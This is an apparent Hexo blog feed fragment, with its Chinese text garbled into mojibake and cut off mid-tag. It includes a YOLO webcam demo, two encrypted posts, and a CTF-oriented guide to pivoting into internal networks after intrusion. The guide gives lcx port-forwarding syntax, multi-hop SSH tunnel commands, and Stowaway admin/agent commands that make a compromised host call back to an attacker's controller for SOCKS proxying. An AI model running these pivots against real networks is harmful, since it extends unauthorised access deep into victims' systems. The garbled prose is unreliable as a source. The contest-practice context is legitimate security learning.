ç»ˆç«¯æ—¶ï¼Œå¯ç”¨ä¸‹è½½ <a href="https://docs.ultralytics.com/integrations/vscode/">Ultralytics-Snippets</a> æ‰©å±•çš„æç¤ºã€‚</td></tr></tbody></table><p>å¯ä»¥é€šè¿‡pythonä»£ç æ¥è¿›è¡Œè®¾ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ultralytics <span class="hljs-keyword">import</span> settings<br><br><span class="hljs-comment">#æ›´æ–°ä¸€ä¸ª</span><br>settings.update(&#123;<span class="hljs-string">&quot;runs_dir&quot;</span>: <span class="hljs-string">&quot;/path/to/runs&quot;</span>&#125;)<br><br><span class="hljs-comment">#æ›´æ–°å¤šä¸ª</span><br>settings.update(&#123;<span class="hljs-string">&quot;runs_dir&quot;</span>: <span class="hljs-string">&quot;/path/to/runs&quot;</span>, <span class="hljs-string">&quot;tensorboard&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br><br><span class="hljs-comment">#é‡ç½®æ‰€æœ‰å‚æ•°</span><br>settings.reset()<br></code></pre></td></tr></table></figure><h1 id="ç®€å•çš„demo"><a href="#ç®€å•çš„demo" class="headerlink" title="ç®€å•çš„demo"></a>ç®€å•çš„demo</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2  <span class="hljs-comment">#åŠ è½½opencv</span><br><span class="hljs-keyword">from</span> ultralytics <span class="hljs-keyword">import</span> YOLO <span class="hljs-comment">#å¯¼å…¥æ¨¡å‹åº“</span><br><br><span class="hljs-comment"># åŠ è½½æ¨¡å‹</span><br>yolo = YOLO(<span class="hljs-string">&quot;yolo11n.pt&quot;</span>)<br><br><span class="hljs-comment"># æ‰“å¼€æ‘„åƒå¤´ ï¼ˆ0 è¡¨ç¤ºå†…ç½®æ‘„åƒå¤´ï¼Œå¦‚æœæœ‰å¤šä¸ªæ‘„åƒå¤´ï¼Œå¯ä»¥ç”¨ 1, 2 ç­‰ï¼‰</span><br><br>cap = cv2.VideoCapture(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#cap.isOpened() æ£€æŸ¥æ‘„åƒå¤´æ˜¯å¦æˆåŠŸæ‰“å¼€</span><br><span class="hljs-keyword">while</span> cap.isOpened():<br>    <br>    cap.read()ï¼šè¯»å–æ‘„åƒå¤´ç”»é¢ï¼Œè¿”å›ä¸¤ä¸ªå€¼ï¼šsuccess: æ˜¯å¦æˆåŠŸè¯»å– (<span class="hljs-literal">True</span> / <span class="hljs-literal">False</span>)frame: å½“å‰å¸§çš„å›¾åƒæ•°æ®ï¼ˆnumpy æ•°ç»„ï¼‰<br>    success, frame = cap.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> success:<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># ç›®æ ‡æ£€æµ‹</span><br>    results = yolo(frame)<br><br>    <span class="hljs-comment"># è·å–æ£€æµ‹åçš„å›¾åƒ.plot(): åœ¨å›¾ç‰‡ä¸Šç»˜åˆ¶æ£€æµ‹ç»“æœï¼ˆæ¯”å¦‚è¾¹ç•Œæ¡†ã€ç±»åˆ«æ ‡ç­¾ã€ç½®ä¿¡åº¦</span><br>    annotated_frame = results[<span class="hljs-number">0</span>].plot()<br><br>    <span class="hljs-comment"># æ˜¾ç¤ºå›¾åƒcv2.imshow(&quot;çª—å£åç§°&quot;, å›¾åƒ): å¼¹å‡ºä¸€ä¸ªçª—å£ï¼Œæ˜¾ç¤ºæ£€æµ‹ç»“æœ</span><br>    cv2.imshow(<span class="hljs-string">&quot;YOLOv11 Detection&quot;</span>, annotated_frame)<br><br>    <span class="hljs-comment">#cv2.waitKey(1): ç­‰å¾…é”®ç›˜è¾“å…¥ 1 æ¯«ç§’ã€‚</span><br>    <span class="hljs-comment"># ord(&#x27;q&#x27;): ç›‘å¬ q é”®ï¼ŒæŒ‰ä¸‹ q åé€€å‡ºå¾ªç¯</span><br>    <span class="hljs-keyword">if</span> cv2.waitKey(<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFF</span> == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;q&#x27;</span>):<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#cap.release(): å…³é—­æ‘„åƒå¤´ï¼Œé‡Šæ”¾èµ„æºã€‚</span><br>cap.release()<br><span class="hljs-comment">#cv2.destroyAllWindows(): å…³é—­æ‰€æœ‰ OpenCV çª—å£</span><br>cv2.destroyAllWindows()<br><br></code></pre></td></tr></table></figure><p>æœªå®Œå¾…ç»­ğŸ˜ğŸ‘ŒğŸ‘Œ</p>]]></content>
    
    
    
    <tags>
      
      <tag>è¯¾å¤–å…´è¶£</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windowæ·±å…¥å­¦ä¹ </title>
    <link href="/2025/03/20/window%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/20/window%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e872ba465fb5e9bec18111ffe0b3786d47aac89aa7c38db4c50bfb2cb26b6c36">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0f5ac16fc0a5bf0fc4cb03ea2d2c7da32126bf76dacf986e548488aba7a86ef5ed40ee4c3666af9bc0721eb3cf9546878e478fa93b30e8901af0d849c9127094a9641880dbb05c36d0f967ee93fb1d83e2867983fa41958b97d5aa944f1dfa072502cd13db2f6aaaffd0532a57a6085f013c6ad1fc451199fcc0380284c0e6a8976bddb7eccc0f577059512b02efabe8d1c96fb1d3e18236aa19ef598b455ff79fe2248335f86e77ab849e546c1b636ab20d0960e2fa38225deaa67d59819f1f0643e021ab5542af1c386da17003d6880c1e144174fef81322ab4b1a2cfb4d00fa9f9fd5ff6ed740c23817fb28bc94ea7226e5ebbba448dfc107b7ac353975df7d15466b6c9b92e97e8710bf9128ecc3436202f64791b20db8f965dad4b36395850c447b3ca8aa2f09037e7851e4cda10</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>window</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linuxæ·±å…¥å­¦ä¹ </title>
    <link href="/2025/03/20/linux%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/20/linux%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="254ebc4a7840b74e5f820b9f9cd7104de46dee4fa2a279c5bfded33c75957810">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0f5ac16fc0a5bf0fc4cb03ea2d2c7da32126bf76dacf986e548488aba7a86ef5ed40ee4c3666af9bc0721eb3cf9546878e478fa93b30e8901af0d849c9127094a2a9661886706f8f95138011a4a4a8aac</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…ç½‘ä»£ç†æ­å»º</title>
    <link href="/2025/03/17/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/03/17/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨adwpæˆ–è€…adwèµ›åˆ¶ä¸­å½“æˆ‘ä»¬æ‰“è¿›å†…ç½‘æ—¶(å‰ææ˜¯æ‰“è¿›å»ï¼Œè¿™å°±ä¸å¾—ä¸æccbäº†ğŸ˜­)ï¼Œæ­å»ºä»£ç†æ˜¯å¿…ä¸å¯å°‘çš„ä¸€éƒ¨åˆ†</p><p>ä»‹ç»å‡ ç§ç®€å•çš„æ–¹æ³•</p><h1 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h1><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>æœ‰å…¬ç½‘ipçš„è¯å¯ä»¥è¯•è¯•frp</p><p>æœ‰æ—¶é—´è¡¥ä¸Š(ç‹—å¤´)ğŸ¶</p><h2 id="èŠ±ç”Ÿå£³å†…ç½‘ç©¿é€"><a href="#èŠ±ç”Ÿå£³å†…ç½‘ç©¿é€" class="headerlink" title="èŠ±ç”Ÿå£³å†…ç½‘ç©¿é€"></a>èŠ±ç”Ÿå£³å†…ç½‘ç©¿é€</h2><p>æ²¡æœ‰å…¬ç½‘ipçš„è¯å°±ç›´æ¥ä½¿ç”¨èŠ±ç”Ÿå£³å§</p><p><a href="https://console.hsk.oray.com/forward">å®˜ç½‘</a></p><p>ç®€å•æ— è„‘ä¸€çœ‹å°±ä¼š</p><h1 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h1><p>ä½¿ç”¨iptableå¯ä»¥è½¬å‘ä½†æ˜¯å¤Ÿç®€å•ï¼Œæœ‰æ²¡æœ‰ç®€å•åˆæ–¹ä¾¿çš„æ–¹æ³•çš„å‘¢</p><p>æœ‰çš„å…„å¼Ÿæœ‰çš„ï¼Œé‚£å°±æ˜¯LCXç®€å•çš„ç«¯å£è½¬å‘å·¥å…·</p><p><strong>åŸºæœ¬ä½¿ç”¨</strong></p><p><code>-llisten</code>æœ¬åœ°ç›‘å¬æ¨¡å¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">lcx -listen <span class="hljs-tag">&lt;<span class="hljs-name">æœ¬åœ°ç«¯å£</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">è½¬å‘ç«¯å£</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å°†æœ¬åœ°ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°çš„è½¬å‘ç«¯å£</p><p><code>-slave</code>è¿œç¨‹è½¬å‘æ¨¡å¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">lcx -slave <span class="hljs-tag">&lt;<span class="hljs-name">æœ¬åœ°IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">æœ¬åœ°ç«¯å£</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">è¿œç¨‹IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">è¿œç¨‹ç«¯å£</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å°†æœ¬åœ°ç«¯å£çš„æµé‡è½¬å‘åˆ°è¿œç¨‹ip</p><p><code>-tran</code>æµé‡è½¬å‘æ¨¡å¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">lcx -tran <span class="hljs-tag">&lt;<span class="hljs-name">æœ¬åœ°ç«¯å£</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">ç›®æ ‡IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">ç›®æ ‡ç«¯å£</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å°†æœ¬åœ°ç«¯å£æµé‡è½¬å‘åˆ°ç›®æ ‡ç«¯å£ï¼Œæ”¯æŒå†…ç½‘ç¯å¢ƒ</p><h1 id="å†…ç½‘éš§é“æ­å»º"><a href="#å†…ç½‘éš§é“æ­å»º" class="headerlink" title="å†…ç½‘éš§é“æ­å»º"></a>å†…ç½‘éš§é“æ­å»º</h1><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>sshæœ‰ç‚¹æ˜¯æ–¹ä¾¿ï¼Œä¸è¦å®‰è£…å•¥ä¸œè¥¿ï¼Œç›´æ¥å°±å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯å¼Šç«¯ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œåªèƒ½ä¸€ä¸ªç«¯å£ä¸€ä¸ªç«¯å£çš„è½¬å‘æµé‡</p><h3 id="å•å±‚sshéš§é“æ­å»º"><a href="#å•å±‚sshéš§é“æ­å»º" class="headerlink" title="å•å±‚sshéš§é“æ­å»º"></a>å•å±‚sshéš§é“æ­å»º</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003401221.png" alt="image-20250318003401221"></p><p>æˆ‘ä»¬çš„æœºå™¨åªèƒ½è®¿é—®å¤–å›´ä¸»æœºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤–å›´ä¸»æœºå½“è·³æ¿è®¿é—®å†…ç½‘</p><p>åœ¨æˆ‘ä»¬æœºå™¨ä¸Šè¿è¡Œ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -L <span class="hljs-number">8085</span>:<span class="hljs-number">172.2</span>.<span class="hljs-number">136.5</span>:<span class="hljs-number">80</span> ctfshow@pwn<span class="hljs-selector-class">.challenge</span><span class="hljs-selector-class">.ctf</span><span class="hljs-selector-class">.show</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">28227</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°†å¯æ§linuxæœåŠ¡å™¨ä¸­172.2.136.5:80çš„æµé‡è½¬å‘åˆ°æœ¬åœ°windowsçš„8085ç«¯å£ä¸Šï¼Œç„¶åå°±å¯ä»¥é€šè¿‡è®¿é—®127.0.0.1:8085ä»¥è®¿é—®172.2.136.5çš„webæœåŠ¡ï¼Œæµé‡è½¬å‘è¿‡ç¨‹ä¸º:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.2.136.5:80</span>-&gt;windowsçš„<span class="hljs-number">80</span>ç«¯å£<br></code></pre></td></tr></table></figure><h3 id="å¤šå±‚sshéš§é“æ­å»º"><a href="#å¤šå±‚sshéš§é“æ­å»º" class="headerlink" title="å¤šå±‚sshéš§é“æ­å»º"></a>å¤šå±‚sshéš§é“æ­å»º</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003945521.png" alt="image-20250318003945521"></p><p>ä¸åŒå†…ç½‘ä¹‹é—´æ²¡æ³•ç›´æ¥ç›¸äº’é€šä¿¡ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æƒ³ç”¨windowsæ”»å‡»æœºç›´æ¥è®¿é—®æ·±å±‚å†…ç½‘çš„webæœåŠ¡ï¼Œéœ€è¦å…ˆåœ¨è¡¨å±‚å†…ç½‘æœåŠ¡å™¨å’Œæ·±å±‚å†…ç½‘æœåŠ¡å™¨ä¹‹é—´å»ºç«‹éš§é“ï¼Œç„¶åå†åœ¨windowsæ”»å‡»æœºå’Œè¡¨å±‚å†…ç½‘æœåŠ¡å™¨ä¹‹é—´å»ºç«‹éš§é“ï¼Œæœ€åå°±å¯ä»¥ç”¨windowsæ”»å‡»æœºç›´æ¥è®¿é—®åˆ°æ·±å±‚å†…ç½‘çš„webæœåŠ¡ã€‚</p><p>åœ¨è¡¨å±‚å†…ç½‘æœåŠ¡å™¨ä¸Šè¿è¡Œï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -L <span class="hljs-number">9383</span>:<span class="hljs-number">172.2</span>.<span class="hljs-number">136.5</span>:<span class="hljs-number">80</span> ctfshow@pwn<span class="hljs-selector-class">.challenge</span><span class="hljs-selector-class">.ctf</span><span class="hljs-selector-class">.show</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">28227</span><br></code></pre></td></tr></table></figure><p>å°†æ·±å±‚å†…ç½‘ä¸­172.2.136.5:80çš„æµé‡è½¬å‘åˆ°è¡¨å±‚å†…ç½‘æœåŠ¡å™¨çš„9383ç«¯å£ä¸Šï¼Œç„¶ååœ¨windowsæœºå™¨ä¸Šè¿è¡Œï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8086</span>:<span class="hljs-number">127.0.0.1:9383</span> root<span class="hljs-variable">@vps_ip</span> -p vps_port<br></code></pre></td></tr></table></figure><p>å°†è¡¨å±‚å†…ç½‘æœåŠ¡å™¨ä¸­127.0.0.1:9383çš„æµé‡è½¬å‘åˆ°windowsæœºå™¨çš„8086ç«¯å£ä¸Šï¼Œæµé‡è½¬å‘çš„è¿‡ç¨‹å˜ä¸ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">172</span>.<span class="hljs-number">2</span>.<span class="hljs-number">136</span>.<span class="hljs-number">5</span>:<span class="hljs-number">80</span>-&gt;VPS:<span class="hljs-number">9383</span>-&gt;windowsçš„<span class="hljs-number">8086</span>ç«¯å£<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨æœ¬åœ°è®¿é—®8086ç›´æ¥è®¿é—®æ·±å±‚å†…ç½‘ä¸­çš„172.2.136.5çš„webæœåŠ¡</p><h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><p>ç›®å‰æœ‰å¾ˆå¤šä¼˜ç§€çš„å†…ç½‘ä»£ç†å·¥å…·å¦‚<a href="https://so.csdn.net/so/search?q=frp&spm=1001.2101.3001.7020">frp</a>, npsç­‰ï¼Œä½†æ˜¯æœ‰äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºå¤šçº§ç½‘ç»œä»£ç†ï¼Œç›´è¾¾ç›®æ ‡å†…ç½‘æ·±å¤„ã€‚è€Œç›®å‰frpï¼Œnpsç­‰å·¥å…·åœ¨æ­å»ºå¤šçº§ä»£ç†æ—¶æ“ä½œè¿‡å»å¤æ‚ä¸ä¾¿äºç®¡ç†ã€‚</p><p>è€ŒStowawayå·¥å…·å°±æ˜¯éœ€è¦è§£å†³è¿™ä¸€é—®é¢˜ã€‚Stowawayæ˜¯ä¸€ä¸ªåˆ©ç”¨goè¯­è¨€ç¼–å†™ã€ä¸“ä¸ºæ¸—é€æµ‹è¯•å·¥ä½œè€…åˆ¶ä½œçš„å¤šçº§ä»£ç†å·¥å…·ï¼Œç”¨æˆ·å¯ä½¿ç”¨æ­¤ç¨‹åºå°†å¤–éƒ¨æµé‡é€šè¿‡å¤šä¸ªèŠ‚ç‚¹ä»£ç†è‡³å†…ç½‘ï¼Œçªç ´å†…ç½‘è®¿é—®é™åˆ¶ï¼Œæ„é€ æ ‘çŠ¶èŠ‚ç‚¹ç½‘ç»œï¼Œå¹¶è½»æ¾å®ç°ç®¡ç†åŠŸèƒ½</p><p>å®ƒä¸ä»…ä»…æ˜¯linuxå¯¹linuxï¼Œwinå¯¹winè¿˜å¯ä»¥ winå¯¹linuxï¼Œæˆ‘æœ€å–œæ¬¢çš„å°±æ˜¯è¿™ä¸ª</p><p><strong>towawayä¸€å…±åŒ…å«ä¸¤ç§è§’è‰²</strong>ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li><p>admin ä»£è¡¨æ§åˆ¶ç«¯</p></li><li><p>agent ä»£è¡¨è¢«æ§ç«¯</p></li></ul><p>adminï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l è¢«åŠ¨æ¨¡å¼ä¸‹çš„ç›‘å¬åœ°å€[ip]:&lt;port&gt;<br><br>-s èŠ‚ç‚¹é€šä¿¡åŠ å¯†å¯†é’¥,æ‰€æœ‰èŠ‚ç‚¹(admin&amp;&amp;agent)å¿…é¡»ä¸€è‡´<br><br>-c ä¸»åŠ¨æ¨¡å¼ä¸‹çš„ç›®æ ‡èŠ‚ç‚¹åœ°å€<br><br>--proxy socks5ä»£ç†æœåŠ¡å™¨åœ°å€<br><br>--proxyu socks5ä»£ç†æœåŠ¡å™¨ç”¨æˆ·å(å¯é€‰)<br><br>--proxyp socks5ä»£ç†æœåŠ¡å™¨å¯†ç (å¯é€‰)<br><br>--down ä¸‹æ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP<br></code></pre></td></tr></table></figure><p>agentï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l è¢«åŠ¨æ¨¡å¼ä¸‹çš„ç›‘å¬åœ°å€[ip]:&lt;port&gt;<br><br>-s èŠ‚ç‚¹é€šä¿¡åŠ å¯†å¯†é’¥<br><br>-c ä¸»åŠ¨æ¨¡å¼ä¸‹çš„ç›®æ ‡èŠ‚ç‚¹åœ°å€<br><br>--proxy socks5ä»£ç†æœåŠ¡å™¨åœ°å€<br><br>--proxyu socks5ä»£ç†æœåŠ¡å™¨ç”¨æˆ·å(å¯é€‰)<br><br>--proxyp socks5ä»£ç†æœåŠ¡å™¨å¯†ç (å¯é€‰)<br><br>--reconnect é‡è¿æ—¶é—´é—´éš”ï¼ˆsï¼‰<br><br>--rehost ç«¯å£å¤ç”¨æ—¶å¤ç”¨çš„IPåœ°å€<br><br>--report ç«¯å£å¤ç”¨æ—¶å¤ç”¨çš„ç«¯å£å·<br><br>--up ä¸Šæ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP<br><br>--down ä¸‹æ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP<br><br>--cs è¿è¡Œå¹³å°çš„shellç¼–ç ç±»å‹ï¼Œé»˜è®¤ä¸ºutf-8ï¼Œå¯é€‰gbk<br></code></pre></td></tr></table></figure><h3 id="å•å±‚éš§é“æ­å»º"><a href="#å•å±‚éš§é“æ­å»º" class="headerlink" title="å•å±‚éš§é“æ­å»º"></a>å•å±‚éš§é“æ­å»º</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003401221.png" alt="image-20250318003401221"></p><p>æ§åˆ¶ç«¯é…ç½®</p><p>windowsä½¿ç”¨è¢«åŠ¨æ¨¡å¼ï¼Œç›‘å¬ç«¯å£8000ï¼Œå¹¶å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†ç§˜é’¥ä¸º123ã€‚ç­‰å¾…è¢«æ§ç«¯çš„è¿æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows_x64_admin.exe -l 192.168.125.134:8000 -s 123 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows_x64_admin.exe -l 8000 -s 123  <span class="hljs-comment">#æˆ–è€…ä¸æŒ‡å®šipé»˜è®¤ç›‘å¬0.0.0.0</span><br></code></pre></td></tr></table></figure><p>è¢«æ§ç«¯é…ç½®</p><p>åœ¨å¯æ§linuxä¸Šæ‰§è¡Œï¼Œä½¿ç”¨ç§˜é’¥123è¿æ¥æ§åˆ¶ç«¯8000ç«¯å£ï¼Œå¹¶è®¾ç½®é‡è¿é—´éš”æ—¶é—´ï¼Œå½“æ§åˆ¶ç«¯æ‰çº¿æ—¶å®¢æˆ·ç«¯æ¯éš”8sé‡è¿æ§åˆ¶ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c 192.168.125.134:8000 -s 123 --reconnect 8<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å®¢æˆ·ç«¯ä¸æ§åˆ¶ç«¯é—´æ­å»ºäº†ä¸€æ¡sockséš§é“ã€‚</p><p>æ­¤æ—¶ï¼Œadminç«¯å°±å¯ä»¥æ§åˆ¶</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314000539830.png" alt="image-20250314000539830"></p><p>å¯ä»¥çœ‹åˆ°detailæœ‰ä¸€ä¸ªèŠ‚ç‚¹</p><p>æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªèŠ‚ç‚¹<code>use 0</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314000649868.png" alt="image-20250314000649868"></p><p>å»ºç«‹sockséš§é“</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314001615923.png" alt="image-20250314001615923"></p><p>åœ¨windowsä½¿ç”¨proxifieråˆ›å»ºä»£ç†</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314001732271.png" alt="image-20250314001732271"></p><p>åˆ›å»ºä»£ç†è§„åˆ™</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314003554392.png" alt="image-20250314003554392"></p><p>ç›®æ ‡ipå¡«ç›®æ ‡é¶æœºåœ°å€</p><p>åœ¨linuxä½¿ç”¨proxychainsåˆ›å»ºä»£ç†</p><p>æˆ‘ä»¬éœ€è¦ä¿®æ”¹&#x2F;etc&#x2F;proxychains4.conf </p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314002529186.png" alt="image-20250314002529186"></p><p>ä¿®æ”¹æˆæŒ‡å®šç«¯å£(è¿™é‡Œæ˜¯windowsåšadminå°±ä¸æ¼”ç¤º)</p><p>æˆåŠŸè®¿é—®å†…ç½‘</p><p><img 